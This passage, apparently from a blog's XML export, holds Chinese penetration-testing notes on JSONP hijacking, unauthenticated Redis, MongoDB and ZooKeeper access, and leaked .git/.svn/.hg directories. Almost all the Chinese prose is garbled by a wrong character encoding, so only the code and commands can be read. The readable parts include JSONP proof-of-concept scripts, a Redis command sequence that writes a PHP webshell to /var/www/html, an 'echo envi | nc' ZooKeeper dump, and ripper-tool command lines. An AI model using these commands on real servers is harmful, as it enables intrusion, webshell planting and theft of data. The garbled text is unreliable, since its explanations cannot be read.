HijackingÁöÑÊ†∏ÂøÉÊÄùÊÉ≥ÂíåCSRFÊîªÂáªÁöÑÊ†∏ÂøÉÊÄùÊÉ≥Â∫îËØ•ÊòØ‰∏ÄËá¥ÁöÑÔºâÔºåËøôÈáåÊòØÂØπObjectÁöÑMoneyÂ±ûÊÄßËÆæÁΩÆ‰∫Ü‰∏Ä‰∏™HookÔºåÂú®JavaScript‰∏≠ÔºåÁî±‰∫éÂÖ∂‰ªñÁöÑÂØπË±°ÈÉΩÊòØÊ¥æÁîüËá™ObjectÁöÑÔºåÊâÄ‰ª•ËøôÊÆµ‰ª£Á†ÅÂ∞±ÂØπÊâÄÊúâÂØπË±°ÁöÑMoneyÂ±ûÊÄßÈÉΩÂÅö‰∫Ü‰∏Ä‰∏™HookÔºåÂΩìÊúâÂØπË±°ËÆæÁΩÆÂÆÉÁöÑMoneyÂ±ûÊÄßÊó∂ÔºåÈÉΩ‰ºöËß¶Âèë‰∏äÈù¢ËøôÊÆµ‰ª£Á†ÅÁöÑËøêË°å„ÄÇÊ≥®ÊÑèÁöÑÊòØÔºödefineSetterËøô‰∏™Âú®IEÁ≥ªÂàóÁöÑÊµèËßàÂô®Â•ΩÂÉèÊòØ‰∏çÂèóÊîØÊåÅÁöÑÔºàÂú®IE6‰∏ãËØï‰∫Ü‰∏çË°åÔºâÔºå‰ΩÜFireFoxÁ≥ªÂàóÁöÑÊµèËßàÂô®ÊòØËÇØÂÆöÊîØÊåÅÁöÑ„ÄÇ ÂêéÈù¢ÁöÑvar objString=‚Äù‚Äù‚Ä¶ËøôÂ∞±ÊòØÂèëÈÄÅÂèóÂÆ≥ËÄÖ‰ø°ÊÅØÂà∞ÊÅ∂ÊÑèÁ´ôÁÇπ‰∫ÜÔºåËøôÈáå‰∏çËØ¥‰∫Ü„ÄÇ ÂΩìÊµèËßàÂô®Ëß£ÊûêÔºà3Ôºâ‰∏≠ÁöÑJSONÊï∞ÁªÑÊó∂Ôºå‰ºöÊñ∞Âª∫‰∏Ä‰∏™ÂØπË±°Âπ∂ËµãÂÄºÔºåËøôÊó∂ÂÄôÂ∞±Âá∫Âèë‰∫Ü‰∏äÈù¢ËøôÊÆµ‰ª£Á†ÅÔºåÁªìÊûúÁßÅÈöê‰ø°ÊÅØÂ∞±ÂèëÈÄÅÂà∞ÊÅ∂ÊÑèÁ´ôÁÇπ‰∫Ü„ÄÇ ÈÄöËøá Object.prototype.__defineSetter__Ëøô‰∏™ÂáΩÊï∞Êù•Ëß¶ÂèëËá™Â∑±ÁöÑÊÅ∂ÊÑè‰ª£Á†Å„ÄÇ‰ΩÜÊòØËøô‰∏™ÂáΩÊï∞Âú®ÂΩìÂâçÁöÑÊñ∞ÁâàÊú¨chromeÂíåfirefox‰∏≠ÈÉΩÂ∑≤ÁªèÂ§±Êïà‰∫Ü„ÄÇ Ëß£ÂÜ≥ÊñπÊ≥ï1„ÄÅÈ™åËØÅ HTTP Referer Â§¥‰ø°ÊÅØÔºõ 2„ÄÅÂú®ËØ∑Ê±Ç‰∏≠Ê∑ªÂä† csrfToken Âπ∂Âú®ÂêéÁ´ØËøõË°åÈ™åËØÅÔºõ jsonpÂä´ÊåÅÂØªÊâæjsonpÁöÑÊé•Âè£1.burpÊäìÂåÖÔºå‰∏ÄËà¨ÊúâjsonpÁöÑÊï∞ÊçÆ‰º†Ëæì‰ºöÂú®mimetype‰∏≠ÊòæÁ§∫‰∏∫scriptÔºåÈÄöËøáÊéíÂ∫èÂèØ‰ª•Âø´ÈÄüÂæóÊâæÂà∞ 2.ÁÅ´ÁãêÊéßÂà∂Âè∞Êü•ÊâæÂåÖ 3.fuzz Â¶ÇÊûújsonpÁöÑÊé•Âè£Ê≤°ÊúâÊïèÊÑü‰ø°ÊÅØ‰º†ËæìÔºåjsonÊï∞ÊçÆÂåÖ‰∏≠ÊÅ∞Â•ΩÊúâÁöÑËØùÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ùËØï‰∏Ä‰∏ãÁ®ãÂ∫èÂëòÊòØÂê¶ÊúâÂºÄÂèëjsonpÁöÑÊ†ºÂºèÔºåÂ§ßÂ§öÊï∞Á®ãÂ∫èÂëòÂñúÊ¨¢ÊääjsonpÁöÑÂõû‰º†ÂèÇÊï∞ÂëΩÂêç‰∏∫callback ÂΩìÁÑ∂ËøòÊúâÂÖ∂‰ªñÁöÑÂèØËÉΩÔºåÂ≠óÂÖ∏Áî®Intruder Fuzz‰∏Ä‰∏ãËØïËØïÔºö callback=attack cb=attack call=attack jsonp=attack jsonpcallback=attack jsonpcb=attack json=attack jsoncallback=attack jcb=attackÊüê‰∫ëÂÆû‰æã Â§çÂà∂Âà∞urlÈáå‰æøÂèØ‰ª•Ê£ÄÈ™åÊòØÂê¶Â≠òÂú®jsonpÊé•Âè£ÊºèÊ¥û„ÄÇ ‰øÆÊîπcallbackÂéüÂáΩÊï∞‰æøÂèØÂ∞ÜjsonÊï∞ÊçÆÂÖ®ÈÉ®ÊòæÁ§∫Âá∫Êù•Ôºå‰∏Ä‰∫õÊïèÊÑü‰ø°ÊÅØ„ÄÇ poc &lt;script&gt; function peiqi(json){ alert(json.result.pin) } &lt;/script&gt; &lt;script src=&quot;https://xx.xx.xx.xx/menu/getUserMenu?callback=peiqi&quot;&gt;&lt;/script&gt;pocÂèØ‰ª•ÁªßÁª≠ÊûÑÈÄ†Âà∂ÂÆöÂèëÈÄÅÂà∞Ëá™Â∑±ÁöÑÈ°µÈù¢ÔºåÂèØËßÅjsonpÁöÑÂéüÁêÜ‰∏écsrfÂü∫Êú¨‰∏∫‰∏ÄËá¥ÁöÑÔºåÂà©Áî®Áî®Êà∑ÁöÑË∫´‰ªΩÊù•ÂÅö‰∏Ä‰∫õ‰∫ãÊÉÖÔºåÊàñËÄÖÂèëÈÄÅËá™Â∑±ÁöÑ‰ø°ÊÅØÁªôÂà´‰∫∫Ôºå ÊüêX jsonp POC &lt;script&gt; function peiqi(json){ alert(json.userName) } &lt;/script&gt; &lt;script src=&quot;http://XX.XXXXX.com/checkLogin?callback=peiqi&amp;_=15436278817&quot;&gt;&lt;/script&gt;ÁõÆÂâçÊåñÊéòjsonp ‰∏ÄËà¨ÊòØF12 ÂØªÊâæcallbackÂáΩÊï∞ÔºåÊé®Ëçê‰∏ÄÊ¨æËá™Âä®Ê£ÄÊµãXSS jsonpÁöÑË∞∑Ê≠åÊèí‰ª∂ XssSniper ÁªïËøá‰∏Ä‰∫õÂØπreferer ËøõË°åÈ™åËØÅÔºå‰ΩÜÊòØÊúâÁöÑÊó∂ÂÄôÁ©∫refererÂèØ‰ª•ÁªïËøáÈ™åËØÅ„ÄÇ ÂèÇËÄÉÔºöhttps://blog.csdn.net/yjclsx/article/details/80340901ÂèÇËÄÉÔºöhttp://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htmlÂèÇËÄÉÔºöhttps://shiyousan.com/post/635441704246553316]]></content>
      <tags>
        <tag>Ê∏óÈÄèÊîªÈò≤</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Â∏∏ËßÅ‰ø°ÊÅØÊ≥ÑÈú≤]]></title>
    <url>%2F2018%2F10%2F28%2F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%2F</url>
    <content type="text"><![CDATA[1.redisÊï∞ÊçÆÂ∫ì‰ªªÊÑèËÆøÈóÆÁÆÄ‰ªãredisÈªòËÆ§Êï∞ÊçÆÂ∫ìÁ´ØÂè£6379Ôºå Êú™ËÆæÁΩÆÂØÜÁ†ÅÈÄ†Êàê‰ªªÊÑèËÆøÈóÆÔºåÁÑ∂Âêé‰ΩøÁî®redisÊùÉÈôêÂÜôÊñá‰ª∂„ÄÇ RedisÂõ†ÈÖçÁΩÆ‰∏çÂΩìÂèØ‰ª•ÂØºËá¥Êú™ÊéàÊùÉËÆøÈóÆÔºåË¢´ÊîªÂáªËÄÖÊÅ∂ÊÑèÂà©Áî®„ÄÇÂΩìÂâçÊµÅË°åÁöÑÈíàÂØπRedisÊú™ÊéàÊùÉËÆøÈóÆÁöÑ‰∏ÄÁßçÊñ∞ÂûãÊîªÂáªÊñπÂºèÔºåÂú®ÁâπÂÆöÊù°‰ª∂‰∏ãÔºåÂ¶ÇÊûúRedis‰ª•rootË∫´‰ªΩËøêË°åÔºåÈªëÂÆ¢ÂèØ‰ª•ÁªôrootË¥¶Êà∑ÂÜôÂÖ•SSHÂÖ¨Èí•Êñá‰ª∂ÔºåÁõ¥Êé•ÈÄöËøáSSHÁôªÂΩïÂèóÂÆ≥ÊúçÂä°Âô®ÔºåÂèØÂØºËá¥ÊúçÂä°Âô®ÊùÉÈôêË¢´Ëé∑ÂèñÂíåÊï∞ÊçÆÂà†Èô§„ÄÅÊ≥ÑÈú≤ÊàñÂä†ÂØÜÂãíÁ¥¢‰∫ã‰ª∂ÂèëÁîüÔºå‰∏•ÈáçÂç±ÂÆ≥‰∏öÂä°Ê≠£Â∏∏ÊúçÂä°„ÄÇ ÈÉ®ÂàÜÊúçÂä°Âô®‰∏äÁöÑRedis ÁªëÂÆöÂú® 0.0.0.0:6379ÔºåÂπ∂‰∏îÊ≤°ÊúâÂºÄÂêØËÆ§ËØÅÔºàËøôÊòØRedis ÁöÑÈªòËÆ§ÈÖçÁΩÆÔºâÔºå‰ª•ÂèäËØ•Á´ØÂè£ÂèØ‰ª•ÈÄöËøáÂÖ¨ÁΩëÁõ¥Êé•ËÆøÈóÆÔºåÂ¶ÇÊûúÊ≤°ÊúâÈááÁî®Áõ∏ÂÖ≥ÁöÑÁ≠ñÁï•ÔºåÊØîÂ¶ÇÊ∑ªÂä†Èò≤ÁÅ´Â¢ôËßÑÂàôÈÅøÂÖçÂÖ∂‰ªñÈùû‰ø°‰ªªÊù•Ê∫ê ip ËÆøÈóÆÁ≠âÔºåÂ∞Ü‰ºöÂØºËá¥ Redis ÊúçÂä°Áõ¥Êé•Êö¥Èú≤Âú®ÂÖ¨ÁΩë‰∏äÔºåÂèØËÉΩÈÄ†ÊàêÂÖ∂‰ªñÁî®Êà∑ÂèØ‰ª•Áõ¥Êé•Âú®ÈùûÊéàÊùÉÊÉÖÂÜµ‰∏ãÁõ¥Êé•ËÆøÈóÆRedisÊúçÂä°Âπ∂ËøõË°åÁõ∏ÂÖ≥Êìç‰Ωú„ÄÇ ÁõÆÂâçÊØîËæÉ‰∏ªÊµÅÁöÑÊ°à‰æãÔºöyam2 minerd ÊåñÁüøÁ®ãÂ∫èÔºåËøòÊúâÂú®Â§öÊ¨°Â∫îÊÄ•‰∫ã‰ª∂‰∏≠ÂèëÁé∞Â§ßÈáèÁöÑwatch-smartdÊåñÁüøÊú®È©¨„ÄÇ ÂëΩ‰ª§‰ΩøÁî®info //Êü•ÁúãredisÁâàÊú¨‰ø°ÊÅØ„ÄÅ‰∏Ä‰∫õÂÖ∑‰Ωì‰ø°ÊÅØ„ÄÅÊúçÂä°Âô®ÁâàÊú¨‰ø°ÊÅØÁ≠âÁ≠âÔºö set x ‚Äútest‚Äù //Â∞ÜÂèòÈáèxÁöÑÂÄºËÆæ‰∏∫test flushall //Âà†Èô§Êï∞ÊçÆÂ∫ìÔºåË∞®ÊÖé‰ΩøÁî® KEYS * //Êü•ÁúãÊâÄÊúâÈîÆÔºåredisÂ≠òÂÇ®Êï∞ÊçÆÊ®°Âºè‰∏∫ ‰∏ÄÈîÆ‰∏ÄÊï∞ÊçÆÂØπÂ∫î„ÄÇ CONFIG GET dir //Ëé∑ÂèñÈªòËÆ§ÁöÑredisÁõÆÂΩï CONFIG GET dbfilename//Ëé∑ÂèñÈªòËÆ§ÁöÑrdbÊñá‰ª∂Âêç ÂæÄwebÁâ©ÁêÜË∑ØÂæÑÂÜôwebshellredisËøúÁ®ãËøûÊé• redis-cli -h xx.xx.xx.xxredisÊú¨Âú∞ÊâìÂºÄ redis-cliredisÊúçÂä°ÊâìÂºÄ redis-server ÂΩìredisÊùÉÈôê‰∏çÈ´òÊó∂ÔºåÂπ∂‰∏îÊúçÂä°Âô®ÂºÄÁùÄwebÊúçÂä°ÔºåÂú®redisÊúâwebÁõÆÂΩïÂÜôÊùÉÈôêÊó∂ÔºåÂèØ‰ª•Â∞ùËØïÂæÄwebË∑ØÂæÑÂÜôwebshell ÊâßË°å‰ª•‰∏ãÂëΩ‰ª§ 192.168.63.xx:6379&gt; config set dir /var/www/html/ OK 192.168.63.xx:6379&gt; config set dbfilename shell.php OK 192.168.63.xx:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot; OK 192.168.63.xx:6379&gt; save OK2.mongodbÊï∞ÊçÆÂ∫ì‰ªªÊÑèËÆøÈóÆÁÆÄ‰ªãmongodbÈªòËÆ§Êï∞ÊçÆÂ∫ìÁ´ØÂè£‰∏∫27017 ÂºÄÂêØMongoDBÊúçÂä°Êó∂‰∏çÊ∑ªÂä†‰ªª‰ΩïÂèÇÊï∞Êó∂,ÈªòËÆ§ÊòØÊ≤°ÊúâÊùÉÈôêÈ™åËØÅÁöÑ,ÁôªÂΩïÁöÑÁî®Êà∑ÂèØ‰ª•ÈÄöËøáÈªòËÆ§Á´ØÂè£Êó†ÈúÄÂØÜÁ†ÅÂØπÊï∞ÊçÆÂ∫ì‰ªªÊÑèÊìç‰Ωú(Â¢ûÂà†ÊîπÈ´òÂç±Âä®‰Ωú)ËÄå‰∏îÂèØ‰ª•ËøúÁ®ãËÆøÈóÆÊï∞ÊçÆÂ∫ì Âú®ÂàöÂÆâË£ÖÂÆåÊØïÁöÑÊó∂ÂÄôMongoDBÈÉΩÈªòËÆ§Êúâ‰∏Ä‰∏™adminÊï∞ÊçÆÂ∫ì,Ê≠§Êó∂adminÊï∞ÊçÆÂ∫ìÊòØÁ©∫ÁöÑ,Ê≤°ÊúâËÆ∞ÂΩïÊùÉÈôêÁõ∏ÂÖ≥ÁöÑ‰ø°ÊÅØÔºÅÂΩìadmin.system.users‰∏Ä‰∏™Áî®Êà∑ÈÉΩÊ≤°ÊúâÊó∂ÔºåÂç≥‰ΩømongodÂêØÂä®Êó∂Ê∑ªÂä†‰∫Ü‚ÄîauthÂèÇÊï∞,Â¶ÇÊûúÊ≤°ÊúâÂú®adminÊï∞ÊçÆÂ∫ì‰∏≠Ê∑ªÂä†Áî®Êà∑,Ê≠§Êó∂‰∏çËøõË°å‰ªª‰ΩïËÆ§ËØÅËøòÊòØÂèØ‰ª•ÂÅö‰ªª‰ΩïÊìç‰Ωú(‰∏çÁÆ°ÊòØÂê¶ÊòØ‰ª•‚Äîauth ÂèÇÊï∞ÂêØÂä®),Áõ¥Âà∞Âú®admin.system.users‰∏≠Ê∑ªÂä†‰∫Ü‰∏Ä‰∏™Áî®Êà∑„ÄÇÂä†Âõ∫ÁöÑÊ†∏ÂøÉÊòØÂè™ÊúâÂú®admin.system.users‰∏≠Ê∑ªÂä†Áî®Êà∑‰πãÂêéÔºåmongodbÁöÑËÆ§ËØÅ,ÊéàÊùÉÊúçÂä°ÊâçËÉΩÁîüÊïà ÂëΩ‰ª§‰ΩøÁî®ËøúÁ®ãËøûÊé• mongodb ip root@xiaozhupeiqi:~# mongo xxx.xx.xx.xx MongoDB shell version: 2.6.10 connecting to: xx.xx.xx.xx/test Server has startup warnings: 2018-10-19T14:47:46.342+0800 I CONTROL [initandlisten] ** WARNING: You are running this process as the root user, which is not recommended. 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is &apos;always&apos;. 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] ** We suggest setting it to &apos;never&apos; 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/defrag is &apos;always&apos;. 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten] ** We suggest setting it to &apos;never&apos; 2018-10-19T14:47:46.343+0800 I CONTROL [initandlisten]Âà©Áî®sqlËØ≠Âè• show databases; use admin; show tables; Á≠âÂëΩ‰ª§ÊàñËÄÖ show dbs; #Êü•ÁúãÂÖ®ÈÉ®Êï∞ÊçÆÂ∫ì show collections; #ÊòæÁ§∫ÂΩìÂâçÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑÈõÜÂêàÔºàÁ±ª‰ººÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑË°®Ôºâ show users; #Êü•ÁúãÂΩìÂâçÊï∞ÊçÆÂ∫ìÁöÑÁî®Êà∑‰ø°ÊÅØ use dbname; #ÂàáÊç¢Êï∞ÊçÆÂ∫ìË∑ümysql‰∏ÄÊ†∑ ÊòæÁ§∫dbÁä∂ÊÄÅ db.stats() { &quot;db&quot; : &quot;admin&quot;, &quot;collections&quot; : 3, &quot;objects&quot; : 5, &quot;avgObjSize&quot; : 217.4, &quot;dataSize&quot; : 1087, &quot;storageSize&quot; : 69632, &quot;numExtents&quot; : 0, &quot;indexes&quot; : 5, &quot;indexSize&quot; : 122880, &quot;ok&quot; : 1 }3.ZooKeeperÊú™ÊéàÊùÉËÆøÈóÆÁÆÄ‰ªãZookeeperÁöÑÈªòËÆ§ÂºÄÊîæÁ´ØÂè£ÊòØ2181„ÄÇZookeeperÂÆâË£ÖÈÉ®ÁΩ≤‰πãÂêéÈªòËÆ§ÊÉÖÂÜµ‰∏ã‰∏çÈúÄË¶Å‰ªª‰ΩïË∫´‰ªΩÈ™åËØÅÔºåÈÄ†ÊàêÊîªÂáªËÄÖÂèØ‰ª•ËøúÁ®ãÂà©Áî®ZookeeperÔºåÈÄöËøáÊúçÂä°Âô®Êî∂ÈõÜÊïèÊÑü‰ø°ÊÅØÊàñËÄÖÂú®ZookeeperÈõÜÁæ§ÂÜÖËøõË°åÁ†¥ÂùèÔºàÊØîÂ¶ÇÔºökillÂëΩ‰ª§Ôºâ„ÄÇÊîªÂáªËÄÖËÉΩÂ§üÊâßË°åÊâÄÊúâÂè™ÂÖÅËÆ∏Áî±ÁÆ°ÁêÜÂëòËøêË°åÁöÑÂëΩ‰ª§„ÄÇ ÊºèÊ¥ûÂà©Áî®ÊâßË°å‰ª•‰∏ãÂëΩ‰ª§Âç≥ÂèØËøúÁ®ãËé∑ÂèñËØ•ÊúçÂä°Âô®ÁöÑÁéØÂ¢ÉÔºö echo envi | nc xx.xx.xx.xx 2181 zookeeper.version=3.4.10-39d3a4f269333c922ed3db283be479f9deacaa0f, built on 03/23/2017 10:13 GMT host.name=AY1304161249343xxxxx java.version=1.8.0_171 java.vendor=Oracle Corporation java.home=/usr/local/java/jdk1.8.0_171/jre java.class.path=/data/zookeeper-3.4.10/bin/../build/classes:/data/zookeeper-3.4.10/bin/../build/lib/*.jar:/data/zookeeper-3.4.10/bin/../lib/slf4j-log4j12-1.6.1.jar:/data/zookeeper-3.4.10/bin/../lib/slf4j-api-1.6.1.jar:/data/zookeeper-3.4.10/bin/../lib/netty-3.10.5.Final.jar:/data/zookeeper-3.4.10/bin/../lib/log4j-1.2.16.jar:/data/zookeeper-3.4.10/bin/../lib/jline-0.9.94.jar:/data/zookeeper-3.4.10/bin/../zookeeper-3.4.10.jar:/data/zookeeper-3.4.10/bin/../src/java/lib/*.jar:/data/zookeeper-3.4.10/bin/../conf:.:/usr/local/java/jdk1.8.0_171/lib:/usr/local/java/jdk1.8.0_171/jre/lib:.:$JAVA_HOME/lib:$JAVA_HOME/jre/lib java.library.path=/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib java.io.tmpdir=/tmp java.compiler=&lt;NA&gt; os.name=Linux os.arch=amd64 os.version=3.2.0-29-generic user.name=root user.home=/root user.dir=/data/zookeeper-3.4.10Èò≤Êä§1„ÄÅÁ¶ÅÊ≠¢ÊääZookeeperÁõ¥Êé•Êö¥Èú≤Âú®ÂÖ¨ÁΩë 2„ÄÅÊ∑ªÂä†ËÆøÈóÆÊéßÂà∂ÔºåÊ†πÊçÆÊÉÖÂÜµÈÄâÊã©ÂØπÂ∫îÊñπÂºèÔºàËÆ§ËØÅÁî®Êà∑ÔºåÁî®Êà∑ÂêçÂØÜÁ†ÅÔºâ 3„ÄÅÁªëÂÆöÊåáÂÆöIPËÆøÈóÆ4.Ê∫êÁ†ÅÊ≥ÑÈú≤ÁØá.hgÊ∫êÁ†ÅÊ≥ÑÊºèhg initÁöÑÊó∂ÂÄô‰ºöÁîüÊàê.hg Â∑•ÂÖ∑Ôºöhttps://github.com/kost/dvcs-ripper ÂëΩ‰ª§Ôºörip-hg.pl -v -u http://www.example.com/.hg/ .gitÊ∫êÁ†ÅÊ≥ÑÈú≤ÂéüÁêÜÔºöÂú®ËøêË°ågit initÂàùÂßãÂåñ‰ª£Á†ÅÂ∫ìÁöÑÊó∂ÂÄôÔºå‰ºöÂú®ÂΩìÂâçÁõÆÂΩï‰∏ãÈù¢‰∫ßÁîü‰∏Ä‰∏™.gitÁöÑÈöêËóèÊñá‰ª∂ÔºåÁî®Êù•ËÆ∞ÂΩï‰ª£Á†ÅÁöÑÂèòÊõ¥ËÆ∞ÂΩïÁ≠âÁ≠â„ÄÇÂú®ÂèëÂ∏É‰ª£Á†ÅÁöÑÊó∂ÂÄôÔºåÊää.gitËøô‰∏™ÁõÆÂΩïÊ≤°ÊúâÂà†Èô§ÔºåÁõ¥Êé•ÂèëÂ∏É‰∫Ü„ÄÇ‰ΩøÁî®Ëøô‰∏™Êñá‰ª∂ÔºåÂèØ‰ª•Áî®Êù•ÊÅ¢Â§çÊ∫ê‰ª£Á†Å„ÄÇgitÈùûÂ∏∏‰πãÁÅ´Â∞±ÊòØÂõ†‰∏∫.gitÊñá‰ª∂ÔºåÂõ†‰∏∫ÈáåÈù¢Â≠òÂÇ®‰∫ÜÂêÑÁßçËÆ∞ÂΩïÊó•ÂøóÁâàÊú¨‰ª•ÂèäÊõ¥Êñ∞ÁöÑ‰ø°ÊÅØÔºåÂá†‰πéËøôÈáåÂ≠òÂÇ®ÁùÄgit‰ªìÂ∫ì‰ªéÂ§¥Âà∞Â∞æÁöÑÊñá‰ª∂ÔºåÊâÄ‰ª•Â¶ÇÊûúÊúâ.gitÊ≥ÑÈú≤Ôºå‰Ω†ÁîöËá≥ÂèØ‰ª•ÊâæÂà∞ÂêÑ‰∏™ÁâàÊú¨ÁöÑ‰∏úË•ø„ÄÇ Â∑•ÂÖ∑Ôºöhttps://github.com/lijiejie/GitHack ÂëΩ‰ª§Ôºöpython GitHack.py http://www.example.com/.git/ .DS_StoreÊñá‰ª∂Ê≥ÑÊºèÂéüÁêÜÔºöÂú®ÂèëÂ∏É‰ª£Á†ÅÊó∂Êú™Âà†Èô§Êñá‰ª∂Â§π‰∏≠ÈöêËóèÁöÑ.DS_storeÔºåË¢´ÂèëÁé∞ÂêéÔºåËé∑Âèñ‰∫ÜÊïèÊÑüÁöÑÊñá‰ª∂ÂêçÁ≠â‰ø°ÊÅØ„ÄÇ Â∑•ÂÖ∑Ôºöhttps://github.com/lijiejie/ds_store_exp ÂëΩ‰ª§Ôºöpython ds_store_exp.py http://www.example.com/.DS_Store .SVNÂØºËá¥Êñá‰ª∂Ê≥ÑÈú≤ÂéüÁêÜÔºöSVN‰∫ßÁîüÁöÑ.svnÁõÆÂΩï‰∏ãËøòÂåÖÂê´‰∫Ü‰ª•.svn-baseÁªìÂ∞æÁöÑÊ∫ê‰ª£Á†ÅÊñá‰ª∂ÂâØÊú¨Ôºà‰ΩéÁâàÊú¨SVNÂÖ∑‰ΩìË∑ØÂæÑ‰∏∫text-baseÁõÆÂΩïÔºåÈ´òÁâàÊú¨SVN‰∏∫pristineÁõÆÂΩïÔºâÔºåÂ¶ÇÊûúÊúçÂä°Âô®Ê≤°ÊúâÂØπÊ≠§Á±ªÂêéÁºÄÂÅöËß£ÊûêÔºåÈªëÂÆ¢ÂàôÂèØ‰ª•Áõ¥Êé•Ëé∑ÂæóÊñá‰ª∂Ê∫ê‰ª£Á†Å„ÄÇ Âú®Ë¢´Âà©Áî®ÁöÑÁΩëÂùÄÂêéÈù¢Âä† /.svn/entriesÔºåÂàóÂá∫ÁΩëÁ´ôÁõÆÂΩïÔºåÁîöËá≥‰∏ãËΩΩÊï¥Á´ô„ÄÇ Â∑•ÂÖ∑Ôºö https://www.waitalone.cn/seay-svn-poc-donw-20140505.html ÂëΩ‰ª§Ôºö.exeÊñá‰ª∂ÂÇªÁìúÂºèÊìç‰ΩúÁ≤òË¥¥ www.xxx.xx/.svn/entries .bzrÊ∫êÁ†ÅÊ≥ÑÈú≤bzr‰πüÊòØ‰∏™ÁâàÊú¨ÊéßÂà∂Â∑•ÂÖ∑, ËôΩÁÑ∂‰∏çÊòØÂæàÁÉ≠Èó®, ‰ΩÜÂÆÉ‰πüÊòØÂ§öÂπ≥Âè∞ÊîØÊåÅ, Âπ∂‰∏îÊúâ‰∏çÈîôÁöÑÂõæÂΩ¢ÁïåÈù¢,ÊâÄ‰ª•‰πüÊúâ‰∏Ä‰∫õ‰∫∫ËÆ§‰∏∫bzrÊØîgitË¶ÅÂ•ΩÁî®„ÄÇ ÂéüÁêÜÔºöbzrÂú®ÂàùÂßãÂåñÈ°πÁõÆÊó∂(bzr init/init-repo), ‰ºöÂú®È°πÁõÆÊ†πÁõÆÂΩï‰∫ßÁîüÂêç‰∏∫.bzrÁöÑÈöêËóèÁõÆÂΩï, ÂêåÊ†∑Êö¥Èú≤‰∫ÜÊ∫ê‰ª£Á†ÅÂíåÁî®Êà∑‰ø°ÊÅØ. Â∑•ÂÖ∑Ôºöhttps://github.com/kost/dvcs-ripper ÂëΩ‰ª§Ôºörip-bzr.pl -v -u http://www.example.com/.bzr/ .cvsÊ∫êÁ†ÅÊ≥ÑÈú≤ÂéüÁêÜÔºöCVSÊòØ‰∏Ä‰∏™Âπ¥‰ª£ÊØîËæÉ‰πÖËøúÁöÑÁâàÊú¨ÊéßÂà∂Á≥ªÁªü, ÈÄöËøáÂÆÉÂèØ‰ª•ËøΩË∏™Ê∫ê‰ª£Á†ÅÁöÑÂéÜÂè≤ÂèòÂåñËÆ∞ÂΩïÔºå‰ΩÜÊòØÂõ†‰∏∫ÂäüËÉΩÊØîËæÉÁÆÄÂçï, ËÄå‰∏î‰∏çÊîØÊåÅÂàÜÊîØ, ÊâÄ‰ª•ÂæàÊó©ÂâçÂ∞±Ë¢´‰∏äÈù¢ÊèêÂà∞ÁöÑsvnÊõø‰ª£‰∫Ü„ÄÇcvsÈ°πÁõÆÂú®ÂàùÂßãÂåñ(cvs checkout project)ÁöÑÊó∂ÂÄô, ‰ºöÂú®projectÁõÆÂΩï‰∏ãÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫CVSÁöÑÁõÆÂΩï,ÂÖ∂‰∏≠‰øùÂ≠ò‰∫ÜÂêÑ‰∏™Êñá‰ª∂ÁöÑ‰øÆÊîπÂíåcommitËÆ∞ÂΩï. ÈÄöËøáÊ≠§ÁõÆÂΩïÂèØ‰ª•Ëé∑Âèñ‰ª£Á†ÅÁöÑÂéÜÂè≤ÁâàÊú¨. ÂÖ∂‰∏≠‰∏§‰∏™ÂÖ≥ÈîÆÊñá‰ª∂‰∏∫:CVS/RootÂíåCVS/Entries, ÂàÜÂà´ËÆ∞ÂΩï‰∫ÜÈ°πÁõÆÁöÑÊ†π‰ø°ÊÅØÂíåÊâÄÊúâÊñá‰ª∂ÁöÑÁªìÊûÑ„ÄÇ Â∑•ÂÖ∑Ôºö https://github.com/kost/dvcs-ripper WEB-INF/web.xmlÊ≥ÑÈú≤ WEB-INFÊòØJavaÁöÑWEBÂ∫îÁî®ÁöÑÂÆâÂÖ®ÁõÆÂΩï„ÄÇÂ¶ÇÊûúÊÉ≥Âú®È°µÈù¢‰∏≠Áõ¥Êé•ËÆøÈóÆÂÖ∂‰∏≠ÁöÑÊñá‰ª∂ÔºåÂøÖÈ°ªÈÄöËøáweb.xmlÊñá‰ª∂ÂØπË¶ÅËÆøÈóÆÁöÑÊñá‰ª∂ËøõË°åÁõ∏Â∫îÊò†Â∞ÑÊâçËÉΩËÆøÈóÆ„ÄÇ WEB-INF‰∏ªË¶ÅÂåÖÂê´‰∏Ä‰∏ãÊñá‰ª∂ÊàñÁõÆÂΩïÔºö /WEB-INF/web.xml ÔºöWebÂ∫îÁî®Á®ãÂ∫èÈÖçÁΩÆÊñá‰ª∂ÔºåÊèèËø∞‰∫Ü servlet ÂíåÂÖ∂‰ªñÁöÑÂ∫îÁî®ÁªÑ‰ª∂ÈÖçÁΩÆÂèäÂëΩÂêçËßÑÂàô„ÄÇ /WEB-INF/classes/ ÔºöÂê´‰∫ÜÁ´ôÁÇπÊâÄÊúâÁî®ÁöÑ class Êñá‰ª∂ÔºåÂåÖÊã¨ servlet class ÂíåÈùûservlet classÔºå‰ªñ‰ª¨‰∏çËÉΩÂåÖÂê´Âú® .jarÊñá‰ª∂‰∏≠ /WEB-INF/lib/ ÔºöÂ≠òÊîæwebÂ∫îÁî®ÈúÄË¶ÅÁöÑÂêÑÁßçJARÊñá‰ª∂ÔºåÊîæÁΩÆ‰ªÖÂú®Ëøô‰∏™Â∫îÁî®‰∏≠Ë¶ÅÊ±Ç‰ΩøÁî®ÁöÑjarÊñá‰ª∂,Â¶ÇÊï∞ÊçÆÂ∫ìÈ©±Âä®jarÊñá‰ª∂ /WEB-INF/src/ ÔºöÊ∫êÁ†ÅÁõÆÂΩïÔºåÊåâÁÖßÂåÖÂêçÁªìÊûÑÊîæÁΩÆÂêÑ‰∏™javaÊñá‰ª∂„ÄÇ /WEB-INF/database.properties 